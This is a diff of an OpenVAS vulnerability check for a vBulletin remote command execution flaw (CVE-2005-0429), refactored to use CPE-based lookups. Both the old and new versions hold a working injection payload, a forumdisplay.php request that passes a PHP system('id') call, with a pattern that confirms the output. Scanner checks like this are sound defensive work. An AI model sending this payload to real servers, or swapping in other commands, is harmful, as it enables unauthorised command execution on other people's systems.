@@ -1,5 +1,4 @@
 # OpenVAS Vulnerability Test
-# $Id: vbulletin_forumdisplay_remote_cmd_exec.nasl 11556 2018-09-22 15:37:40Z cfischer $
 # Description: vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability
 #
 # Authors:
@@ -22,13 +21,13 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 #
 
-# Ref: AL3NDALEEB <al3ndaleeb at uk2 dot net>
+CPE = "cpe:/a:vbulletin:vbulletin";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.16455");
-  script_version("$Revision: 11556 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-22 17:37:40 +0200 (Sat, 22 Sep 2018) $");
+  script_version("2019-09-27T07:10:39+0000");
+  script_tag(name:"last_modification", value:"2019-09-27 07:10:39 +0000 (Fri, 27 Sep 2019)");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_cve_id("CVE-2005-0429");
   script_bugtraq_id(12542);
@@ -36,23 +35,21 @@ if(description)
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");
   script_name("vBulletin Forumdisplay.PHP Remote Command Execution Vulnerability");
   script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
-
   script_copyright("This script is Copyright (C) 2005 David Maciejak");
   script_family("Web application abuses");
-  script_dependencies("http_version.nasl", "vbulletin_detect.nasl");
+  script_dependencies("vbulletin_detect.nasl");
   script_require_ports("Services/www", 80);
-  script_mandatory_keys("vBulletin/installed");
-  script_tag(name:"solution", value:"Upgrade vBulletin 3.0.4 or newer");
-  script_tag(name:"summary", value:"The remote host is running vBulletin, a web based bulletin board system
-written in PHP.
+  script_mandatory_keys("vbulletin/detected");
 
-The remote version of this software is vulnerable to remote command
-execution flaw through the script 'forumdisplay.php'.
+  script_tag(name:"solution", value:"Upgrade vBulletin 3.0.4 or newer.");
 
-A malicious user could exploit this flaw to  execute arbitrary command on
-the remote host with the privileges of the web server.");
+  script_tag(name:"summary", value:"The remote version of vBulletin is vulnerable
+  to remote command execution flaw through the script 'forumdisplay.php'.");
 
+  script_tag(name:"impact", value:"A malicious user could exploit this flaw to
+  execute arbitrary command on the remote host with the privileges of the web server.");
+
+  script_tag(name:"qod_type", value:"remote_vul");
   script_tag(name:"solution_type", value:"VendorFix");
 
   exit(0);
@@ -60,19 +57,20 @@ the remote host with the privileges of the web server.");
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 
-port = get_http_port(default:80);
+if(!port = get_app_port(cpe:CPE))
+  exit(0);
 
-install = get_kb_item(string("www/", port, "/vBulletin"));
-if (isnull(install)) exit(0);
-matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
-if (!isnull(matches)) {
-  dir = matches[2];
+if(!dir = get_app_location(cpe:CPE, port:port))
+  exit(0);
 
-  http_check_remote_code (
-			unique_dir:dir,
-			check_request: '/forumdisplay.php?GLOBALS[]=1&f=2&comma=".system(\'id\')."',
-			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
-			command:"id"
-			);
-}
+if(dir == "/")
+  dir = "";
+
+http_check_remote_code(unique_dir:dir,
+                       check_request:'/forumdisplay.php?GLOBALS[]=1&f=2&comma=".system(\'id\')."',
+                       check_result:"uid=[0-9]+.*gid=[0-9]+.*",
+                       command:"id");
+
+exit(99);
